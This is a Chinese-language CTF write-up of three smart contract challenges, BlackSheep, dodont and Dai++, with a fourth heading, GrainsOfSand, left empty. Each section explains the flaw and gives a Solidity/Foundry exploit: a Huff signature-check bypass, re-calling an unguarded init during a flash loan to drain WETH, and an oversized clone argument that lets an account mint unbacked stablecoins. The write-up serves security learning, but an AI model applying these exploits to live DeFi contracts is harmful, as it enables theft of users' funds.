- [BlackSheep](#blacksheep)
- [dodont](#dodont)
- [Dai++](#dai)
- [GrainsOfSand](#grainsofsand)


## BlackSheep

**Goal**

```rust
Bank.balance == 0;
```

**Solution**

目的是从`Bank`中取出所有的存款。

我不是很了解`Huff`，所以基本在通过`AI`解题。

开头定义了`withdraw`接口:

```solidity
function withdraw(bytes32,uint8,bytes32,bytes32) payable returns ()
```

代码中定义了`withdraw`会调用`CHECKVALUE`和`CHECKSIG`。

我们的目的是为了调用

```solidity
selfbalance caller
gas call
end jump
```
前提条件
```solidity
 iszero iszero noauth jumpi
```
就是`CHECKSIG`返回`0`，也就是签名和`xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044` 相等，很显然这是不可能的，所以我们就要想想办法。

后面我看到`CHECKSIG`其实根本没有把值推到栈上，而是end返回了:

```solidity
    0xd8dA6Bf26964AF9D7eed9e03e53415D37AA96044 eq correctSigner jumpi
```

如果匹配错误，`0 jumpi` 其实根本不会执行，而是直接执行下一行`end jump` 这说明什么？

我们不需要思考如何绕过验证`signer`，我们只需要让`CHECKVALUE`() `revert`就好了，这样栈顶的值就会是`0`，从而成功绕过，那么让`CHECKVALUE() revert`其实很简单，我们只需要定义一个合约在他的`fallback`函数中`revert` 即可。

**Exp**

```solidity
contract Exploit {
    function exp(ISimpleBank bank) external payable {
        bank.withdraw{value: 10}(
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x00,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
    }

    fallback() external payable {
        require(msg.value > 30);
    }
}
```

## dodont

**Goal**

```solidity
function isSolved() external view returns (bool) {
        return WETH.balanceOf(dvm) == 0;
    }
```

**Solution**

题目中给了`DVM`的地址`0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445` ，对`DVM.sol`进行简单的浏览，发现`init`函数没有任何的权限校验，同时有`flashloan`，所以就是通过`flashloan`，在回调函数的时候修改`baseTokenAddress`和`quoteTokenAddress`，从而绕过了检测，并且把所有的`WETH`提取出来。

```solidity
function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external {
        require(baseTokenAddress != quoteTokenAddress, "BASE_QUOTE_CAN_NOT_BE_SAME");
        _BASE_TOKEN_ = IERC20(baseTokenAddress);
        _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);

        require(i > 0 && i <= 10**36);
        _I_ = i;

        require(k <= 10**18);
        _K_ = k;

        _LP_FEE_RATE_ = lpFeeRate;
        _MT_FEE_RATE_MODEL_ = IFeeRateModel(mtFeeRateModel);
        _MAINTAINER_ = maintainer;

        _IS_OPEN_TWAP_ = isOpenTWAP;
        if(isOpenTWAP) _BLOCK_TIMESTAMP_LAST_ = uint32(block.timestamp % 2**32);

        string memory connect = "_";
        string memory suffix = "DLP";

        name = string(abi.encodePacked(suffix, connect, addressToShortString(address(this))));
        symbol = "DLP";
        decimals = _BASE_TOKEN_.decimals();

        // ============================== Permit ====================================
        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),
                0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                chainId,
                address(this)
            )
        );
        // ==========================================================================
    }
```

**Exp**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/dodont/Challenge.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function _QUOTE_TOKEN_() external view returns (address);
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract DoDontTest is Test {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    QuoteToken quoteToken;
    DVMLike dvm;
    Challenge public challenge;

    function setUp() public {
        payable(address(WETH)).call{value: 100 ether}(hex"");

        quoteToken = new QuoteToken();

        dvm = DVMLike(CLONE_FACTORY.clone(DVM_TEMPLATE));
        dvm.init(
            address(this),
            address(WETH),
            address(quoteToken),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );

        WETH.transfer(address(dvm), WETH.balanceOf(address(this)));
        quoteToken.transfer(address(dvm), quoteToken.balanceOf(address(this)) / 2);
        dvm.buyShares(address(this));

        challenge = new Challenge(address(dvm));
    }

    function test_exploitdodont() public {
        dvm.flashLoan(WETH.balanceOf(address(dvm)), quoteToken.balanceOf(address(dvm)), address(this), hex"11");
        if (challenge.isSolved()) {
            console.log("solved");
        } else {
            console.log("not solved");
        }
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        QuoteToken t1 = new QuoteToken();
        QuoteToken t2 = new QuoteToken();
        t1.transfer(address(dvm), 1_000_000 ether);
        t2.transfer(address(dvm), 1_000_000 ether);

        dvm.init(
            address(this),
            address(t1),
            address(t2),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );
    }
}

```

## Dai++

**Goal**

```solidity
function isSolved() external view returns (bool) {
        return IERC20(SYSTEM_CONFIGURATION.getStablecoin()).totalSupply() > 1_000_000_000_000 ether;
    }
```

**Code**

- `SystemConfiguration`：存储系统配置和授权信息
- `AccountManager`：管理账户的创建和稳定币的铸造/销毁
- `Account`：个人账户合约，处理存款，提款和债务
- `Stablecoin`： 稳定币

**Solution**

问题处在`AccountManager`合约中使用`ClonesWithImmutableArgs`创建新用户时候，在`ClonesWithImmutableArgs`的注释中我们可以看到:

```solidity
 /// @notice Creates a clone proxy of the implementation contract, with immutable args
 /// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length
```

用来`Clone`的`data`大小不能超过`65535`字节，当超过的时候，可能会部署一个损坏的合约。

正常的话如果我们要`mint`超过`1_000_000_000_000` `ether`的`stablecoin`，只有被`System` `Configuration`授权的合约才可以`mint`，只有`AccountManager`合约被授权了，而在`AccountManager::mintStablecoins`，会验证是否是`onlyValidAccount`，只有是`ValidAccount`才可以`mint`，同时还会检查账户的债户危机:

```solidity
function isHealthy(uint256 collateralDecrease, uint256 debtIncrease) public view returns (bool) {
        SystemConfiguration configuration = SystemConfiguration(_getArgAddress(0));

        uint256 totalBalance = address(this).balance - collateralDecrease;
        uint256 totalDebt = debt + debtIncrease;

        (, int256 ethPriceInt,,,) = AggregatorV3Interface(configuration.getEthUsdPriceFeed()).latestRoundData();
        if (ethPriceInt <= 0) return false;

        uint256 ethPrice = uint256(ethPriceInt);

        return totalBalance * ethPrice / 1e8 >= totalDebt * configuration.getCollateralRatio() / 10000;
    }
```

所以正常情况下，我们没有那么多的ETH，根本不可能mint那么多的stablecoin。

当我们利用了上面提到的漏洞，我们创造一个受损的合约，因为这种情况下虽然合约的地址会被创建，但是合约字节码被截断了或者损坏，当合约字节码被损坏时，所有的函数调用实际上都会回退到合约的 fallback 函数（如果存在的话）或者直接失败。这就导致了 increaseDebt 函数变成了一个"幻影函数"。从外部看，这个函数似乎存在，但实际上调用它不会执行任何代码。

从而大量的mint stablecoin。

**Exp**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/dai-plus-plus/Challenge.sol";
import "../src/dai-plus-plus/AccountManager.sol";
import "../src/dai-plus-plus/Stablecoin.sol";
import "../src/dai-plus-plus/SystemConfiguration.sol";
import {Account as Acct} from "../src/dai-plus-plus/Account.sol";

contract DaiPlusPlusTest is Test {
    Challenge challenge;
    SystemConfiguration configuration;
    AccountManager manager;

    function setUp() public {
        configuration = new SystemConfiguration();
        manager = new AccountManager(configuration);

        configuration.updateAccountManager(address(manager));
        configuration.updateStablecoin(address(new Stablecoin(configuration)));
        configuration.updateAccountImplementation(address(new Acct()));
        configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

        configuration.updateSystemContract(address(manager), true);
        challenge = new Challenge(configuration);
    }

    function test_daiplusplus() public {
        // 创建一个超长的recoveryAddresses数组
        address[] memory recoveryAddresses = new address[](2044);

        // 打开一个新账户
        Acct account = manager.openAccount(address(this), recoveryAddresses);

        // 铸造大量稳定币
        uint256 targetSupply = 1_000_000_000_000 ether;
        while (IERC20(configuration.getStablecoin()).totalSupply() < targetSupply) {
            manager.mintStablecoins(account, 1_000_000_000_0000 ether, "exploit");
        }
        isSolved();
    }

    function isSolved() public view {
        if (challenge.isSolved()) {
            console.log("Challenge is solved");
        } else {
            console.log("Challenge is not solved");
        }
    }
}

```

## GrainsOfSand
